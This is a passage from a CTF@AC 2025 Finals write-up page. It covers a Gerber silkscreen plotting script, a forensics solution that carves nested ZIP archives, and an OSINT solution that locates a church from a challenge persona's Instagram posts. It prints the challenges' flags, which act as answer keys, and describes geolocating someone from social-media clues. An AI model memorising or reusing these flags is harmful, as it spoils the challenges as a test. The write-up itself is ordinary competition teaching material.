</span></span><span class="line"><span class="cl"><span class="n">cmds</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">gto</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;G01&#34;</span><span class="p">):</span>  <span class="c1"># only linear moves</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;G01X(-?\d+)Y(-?\d+)D(\d+)\*&#34;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">/</span><span class="n">scale</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span><span class="o">/</span><span class="n">scale</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmds</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">segments</span><span class="p">,</span> <span class="n">last</span> <span class="o">=</span> <span class="p">[],</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">cmds</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>          <span class="c1"># D02: move (pen up)</span>
</span></span><span class="line"><span class="cl">        <span class="n">last</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">d</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>        <span class="c1"># D01: draw (pen down)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">last</span><span class="p">:</span> <span class="n">segments</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">last</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">last</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">last</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">figure</span><span class="p">(</span><span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x0</span><span class="p">,</span><span class="n">y0</span><span class="p">,</span><span class="n">x1</span><span class="p">,</span><span class="n">y1</span> <span class="ow">in</span> <span class="n">segments</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">plt</span><span class="o">.</span><span class="n">plot</span><span class="p">([</span><span class="n">x0</span><span class="p">,</span><span class="n">x1</span><span class="p">],[</span><span class="n">y0</span><span class="p">,</span><span class="n">y1</span><span class="p">],</span> <span class="n">linewidth</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">gca</span><span class="p">()</span><span class="o">.</span><span class="n">set_aspect</span><span class="p">(</span><span class="s1">&#39;equal&#39;</span><span class="p">,</span> <span class="n">adjustable</span><span class="o">=</span><span class="s1">&#39;box&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">gca</span><span class="p">()</span><span class="o">.</span><span class="n">invert_yaxis</span><span class="p">()</span>  <span class="c1"># common for PCB viewers</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s2">&#34;Top Silkscreen ‚Äì zoom&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">xlabel</span><span class="p">(</span><span class="s2">&#34;mm&#34;</span><span class="p">);</span> <span class="n">plt</span><span class="o">.</span><span class="n">ylabel</span><span class="p">(</span><span class="s2">&#34;mm&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">plt</span><span class="o">.</span><span class="n">tight_layout</span><span class="p">();</span> <span class="n">plt</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
</span></span></code></pre></div><h2 id="forensics-">Forensics ü§ñ<a hidden class="anchor" aria-hidden="true" href="#forensics-">#</a></h2>
<h3 id="fire-and-ice">Fire and Ice<a hidden class="anchor" aria-hidden="true" href="#fire-and-ice">#</a></h3>
<h4 id="analysis-20">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-20">#</a></h4>
<p>The challenge provides a single file, <code>adofai.zip</code>, that contains a <code>flag.txt</code> file with a flag that does not work.
Using unzip we can see that there is some other data concatenated with the .zip file.</p>
<pre tabindex="0"><code>warning [adofai.zip]: 453 extra bytes at beginning or within zipfile
</code></pre><p>Extra bytes usually mean that another archive (or arbitrary data) is concatenated onto the end of the file. In our case it was another zip file that contained another <code>flag.txt</code>.</p>
<h4 id="solution-17">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-17">#</a></h4>
<p>These are the steps we followed in order to get the flag from this challenge:</p>
<ol>
<li>
<p><strong>Initial inspection</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip -l adofai.zip
</span></span></code></pre></div><p>The output lists a single <code>flag.txt</code>, but the warning about &ldquo;extra bytes&rdquo; is the key clue.</p>
</li>
<li>
<p><strong>Confirm the tail data</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z l adofai.zip
</span></span></code></pre></div><p>7-Zip reports <code>Tail Size = 453</code>, meaning there are 453 bytes of additional data after the normal ZIP structure. That data is another ZIP archive.</p>
</li>
<li>
<p><strong>Carve the zips</strong>
ZIP files end with an End-of-Central-Directory (EOCD) record that begins with the signature <code>PK\x05\x06</code>. The idea is:</p>
<ul>
<li>Find EOCD inside the file.</li>
<li>Copy everything from the start of the file up through the EOCD into its own buffer.</li>
<li>Treat that buffer as a standalone ZIP archive and read its contents.</li>
<li>Move the offset forward and repeat until the original file is exhausted.</li>
</ul>
<p>The following Python snippet automates this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s1">&#39;adofai.zip&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">chunk</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;PK</span><span class="se">\x05\x06</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># ignature that sign the end of a zip file</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">or</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">22</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">comment_len</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">chunk</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">20</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">22</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">archive_len</span> <span class="o">=</span> <span class="n">idx</span> <span class="o">+</span> <span class="mi">22</span> <span class="o">+</span> <span class="n">comment_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">archive_bytes</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[:</span><span class="n">archive_len</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">zf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">archive_bytes</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">name</span> <span class="ow">in</span> <span class="n">zf</span><span class="o">.</span><span class="n">namelist</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="n">contents</span> <span class="o">=</span> <span class="n">zf</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="k">match</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;ctf\{[^}]+\}&#39;</span><span class="p">,</span> <span class="n">contents</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="k">match</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">offset</span> <span class="o">+=</span> <span class="n">archive_len</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">flag</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>
<p><strong>Results</strong>
Running the script prints all three flags:</p>
<ul>
<li><code>ctf{a428cd995d7a8dcd690dbd138f6df56f9df9eaef4610b1747f5fc75c9d432f8f}</code></li>
<li><code>ctf{281dbf950ada8e90f9320071fd871af042fd67d3bdf94043640b9ae673d0c952}</code></li>
<li><code>ctf{6622d9c1a2f093f921c301f19374a568cf243c0b15646e43bcb7585af824dc63}</code></li>
</ul>
<p>Each .zip file contains a single <code>flag.txt</code>, so there are exactly three layers and three flags.</p>
</li>
</ol>
<h2 id="osint-">OSINT üåè<a hidden class="anchor" aria-hidden="true" href="#osint-">#</a></h2>
<h3 id="fangs-overseas">Fangs overseas<a hidden class="anchor" aria-hidden="true" href="#fangs-overseas">#</a></h3>
<h4 id="analysis-21">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-21">#</a></h4>
<p>In this challenge, we are introduced to Vlad da Debugger, an IT guy who traveled and visited a church. Our goal is to find which church he visited.</p>
<p>Searching on social media, I found an Instagram profile named <code>vlad.da.debugger</code>. In the stories, I found a photo taken at <code>Aeroporto Internacional Salgado Filho (Porto Alegre, Brazil)</code>, and in the posts, I found a cat picture with the following description:</p>
<p><code>Found this little beast in my trip and took him for a walk for 36.4 km. Too bad that banks and churches aren't pet friendly. üòí</code></p>
<h4 id="solution-18">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-18">#</a></h4>
<p>Knowing that he was at that specific airport and traveled another 36.4 km, I searched for churches within a radius of approximately <code>36.4 km</code> from the airport and found the <code>Catedral Bas√≠lica S√£o Lu√≠s Gonzaga</code>, whose coordinates are -29.68, -51.13.
According to the flag format CTF{SHA256(lat,lon)}, the flag is:</p>
<p><code>CTF{2516ec825f263d3348127605e0091317f0cd94509055affb67ca09cb4304c301}.</code></p>
<h4 id="script-15">Script<a hidden class="anchor" aria-hidden="true" href="#script-15">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s2">&#34;-29.68,-51.13&#34;</span> <span class="p">|</span> sha256sum
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://pascalctf.github.io/en/tags/ctfatac/">Ctfatac</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/ctf/">Ctf</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/binary/">Binary</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/crypto/">Crypto</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/web/">Web</a></li>
      <li><a href="https://pascalctf.github.io/en/tags/ctfatac2025/">Ctfatac2025</a></li>
    </ul>
<nav class="paginav">
  <a class="next" href="https://pascalctf.github.io/en/ctf/ctfatac2025_quals/">
    <span class="title">Next ¬ª</span>
    <br>
    <span>CTF@AC 2025 Quals</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on x"
            href="https://x.com/intent/tweet/?text=CTF%40AC%202025%20Finals&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f&amp;hashtags=ctfatac%2cctf%2cbinary%2ccrypto%2cweb%2cctfatac2025">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f&amp;title=CTF%40AC%202025%20Finals&amp;summary=CTF%40AC%202025%20Finals&amp;source=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f&title=CTF%40AC%202025%20Finals">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on whatsapp"
            href="https://api.whatsapp.com/send?text=CTF%40AC%202025%20Finals%20-%20https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on telegram"
            href="https://telegram.me/share/url?text=CTF%40AC%202025%20Finals&amp;url=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share CTF@AC 2025 Finals on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=CTF%40AC%202025%20Finals&u=https%3a%2f%2fpascalctf.github.io%2fen%2fctf%2fctfatac2025_finals%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://pascalctf.github.io/en/">Paolo</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
